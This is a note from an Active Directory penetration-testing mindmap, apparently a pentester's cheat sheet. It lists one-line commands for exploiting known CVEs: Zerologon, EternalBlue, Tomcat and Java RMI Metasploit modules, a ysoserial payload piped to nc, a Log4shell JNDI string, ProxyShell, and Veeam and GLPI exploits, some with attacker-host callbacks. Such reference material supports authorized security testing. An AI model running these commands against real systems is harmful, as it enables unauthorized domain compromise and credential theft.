---
title: "Quick Compromise"
category: quick-win
color: "#ebfbee"
tags:
  - ad-mindmap
  - quick-win
  - cve
---

# 🍒 Quick Compromise

> [!info] Mindmap box `Quick Compromise`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## ⚠️ Zerologon (unsafe) CVE-2020-1472
`#CVE` ➡️ [[Domain Admin|Domain admin]]

- `zerologon-scan '<dc_netbios_name>' '<ip>'` [↗](https://github.com/SecuraBV/CVE-2020-1472)
- `cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>` [↗](https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)

## Eternal Blue MS17-010
`#CVE` ➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- `msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only` [↗](https://docs.metasploit.com/)

## Tomcat/Jboss Manager
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- `msf> auxiliary/scanner/http/tomcat_enum` [↗](https://docs.metasploit.com/)
- `msf> exploit/multi/http/tomcat_mgr_deploy` [↗](https://docs.metasploit.com/)

## Java RMI
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- `msf> use exploit/multi/misc/java_rmi_server` [↗](https://docs.metasploit.com/)

## Java Serialiszed port
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- `ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>` [↗](https://github.com/frohoff/ysoserial)

## Log4shell
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- ${jndi:ldap://<ip>:<port>/o=reference}

## Database
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- `msf> use auxiliary/admin/mssql/mssql_enum_sql_logins` [↗](https://docs.metasploit.com/)

## Exchange
➡️ [[Admin Access|Admin]]

- Proxyshell `#CVE`
    - `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>` [↗](https://github.com/dmaasland/proxyshell-poc)

## Veeam
➡️ [[Valid Credentials|User Account]] / [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]

- CVE-2023-27532 (creds - Veeam backup) `#CVE`
    - `VeeamHax.exe --target <veeam_server>` [↗](https://github.com/sfewer-r7/CVE-2023-27532)
    - `CVE-2023-27532 net.tcp:/<target>:<port>/` [↗](https://github.com/horizon3ai/CVE-2023-27532)
- CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) `#CVE`
    - `CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>` [↗](https://github.com/sinsinology/CVE-2024-29849)
- CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) `#CVE`
    - `CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/` [↗](https://github.com/sinsinology/CVE-2024-29855/)
- CVE-2024-40711 (unserialize - Veeam backup) `#CVE`
    - `CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>` [↗](https://github.com/watchtowrlabs/CVE-2024-40711)

## GLPI
➡️ [[Admin Access|Admin]] / [[Low Access (Privilege Escalation)|Low access]]

- CVE-2022-35914 `#CVE`
    - /vendor/htmlawed/htmlawed/htmLawedTest.php
- CVE_2023_41320 `#CVE`
    - `cve_2023_41320.py -u <user> -p <password> -t <ip>` [↗](https://github.com/Guilhem7/CVE_2023_41320)

## Weak websites / services

- nuclei
    - `nuclei -target <ip_range>` [↗](https://github.com/projectdiscovery/nuclei)
- nessus
